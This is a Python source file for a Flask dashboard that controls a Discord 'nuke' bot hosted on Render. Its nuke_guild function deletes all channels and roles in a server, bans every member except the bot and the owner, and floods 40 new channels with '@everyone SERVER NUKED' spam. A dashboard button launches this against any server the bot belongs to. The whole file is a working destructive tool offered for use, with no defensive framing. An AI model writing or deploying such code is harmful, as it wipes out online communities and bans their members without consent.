# app.py
# Flask web dashboard + Discord nuke bot for Render.
# Requires: pip install flask discord.py
# Render: set TOKEN and DASH_KEY as environment variables, start: python app.py

import os
import threading
import asyncio
import discord
from discord.ext import commands
from flask import Flask, request, redirect, url_for, session

TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
DASH_KEY = os.environ.get("DASH_KEY", "changeme")
PREFIX = "!"

SPAM_MESSAGE = "@everyone SERVER NUKED"
SPAM_COUNT = 20
CHANNEL_COUNT = 40

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "flasksecret")

# ---------------- BOT LOGIC ----------------

async def nuke_guild(guild):
    # Delete all channels
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except Exception:
            pass

    # Delete all roles except @everyone and managed
    for role in list(guild.roles):
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
            except Exception:
                pass

    # Ban all members except bot and owner
    for member in list(guild.members):
        if member != guild.me and member != guild.owner:
            try:
                await member.ban(reason="nuke")
            except Exception:
                pass

    # Create 40 channels and spam each
    for i in range(CHANNEL_COUNT):
        try:
            ch = await guild.create_text_channel(f"nuked-{i}")
            for _ in range(SPAM_COUNT):
                try:
                    await ch.send(SPAM_MESSAGE)
                except Exception:
                    pass
        except Exception:
            pass

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"BOT ERROR: {e}", flush=True)

def keep_alive():
    import urllib.request
    import time
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        return
    while True:
        time.sleep(600)
        try:
            urllib.request.urlopen(url)
        except Exception:
            pass

# ---------------- AUTH ----------------

def logged_in():
    return session.get("auth") is True

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("key") == DASH_KEY:
            session["auth"] = True
            return redirect(url_for("index"))
        return "Invalid key", 403
    return """
    <html><body style="background:#111;color:#eee;font-family:monospace">
    <h2>Login</h2>
    <form method="post">
    <input name="key" type="password" placeholder="Dashboard Key" autofocus>
    <button type="submit">Enter</button>
    </form></body></html>
    """

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ---------------- DASHBOARD ----------------

@app.route("/")
def index():
    if not logged_in():
        return redirect(url_for("login"))

    guilds = list(bot.guilds)
    rows = ""
    for g in guilds:
        rows += f"""
        <tr>
            <td>{g.name}</td>
            <td>{g.id}</td>
            <td>{g.member_count}</td>
            <td><a href="/server/{g.id}">Open</a></td>
        </tr>
        """

    return f"""
    <html><body style="background:#111;color:#eee;font-family:monospace">
    <h2>Bot Dashboard</h2>
    <p>Logged in as {bot.user} | <a href="/logout">Logout</a></p>
    <table border="1" cellpadding="8" style="border-collapse:collapse">
    <tr><th>Server</th><th>ID</th><th>Members</th><th>Action</th></tr>
    {rows}
    </table>
    </body></html>
    """

@app.route("/server/<int:guild_id>")
def server(guild_id):
    if not logged_in():
        return redirect(url_for("login"))

    guild = bot.get_guild(guild_id)
    if not guild:
        return "Guild not found", 404

    return f"""
    <html><body style="background:#111;color:#eee;font-family:monospace">
    <h2>{guild.name}</h2>
    <p>ID: {guild.id} | Members: {guild.member_count} | Channels: {len(guild.channels)} | Roles: {len(guild.roles)}</p>
    <form method="post" action="/nuke/{guild.id}">
    <button type="submit" style="background:#900;color:#fff;padding:12px 24px;font-size:16px;border:none;cursor:pointer"
    onclick="return confirm('NUKE {guild.name}?')">NUKE SERVER</button>
    </form>
    <p><a href="/">Back</a></p>
    </body></html>
    """

@app.route("/nuke/<int:guild_id>", methods=["POST"])
def nuke(guild_id):
    if not logged_in():
        return redirect(url_for("login"))

    guild = bot.get_guild(guild_id)
    if not guild:
        return "Guild not found", 404

    # Schedule nuke coroutine on bot's event loop
    fut = asyncio.run_coroutine_threadsafe(nuke_guild(guild), bot.loop)
    try:
        fut.result(timeout=5)
    except Exception:
        pass

    return f"""
    <html><body style="background:#111;color:#eee;font-family:monospace">
    <h2>Nuke launched on {guild.name}</h2>
    <p><a href="/">Back</a></p>
    </body></html>
    """

@app.route("/health")
def health():
    return "OK", 200

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=True)
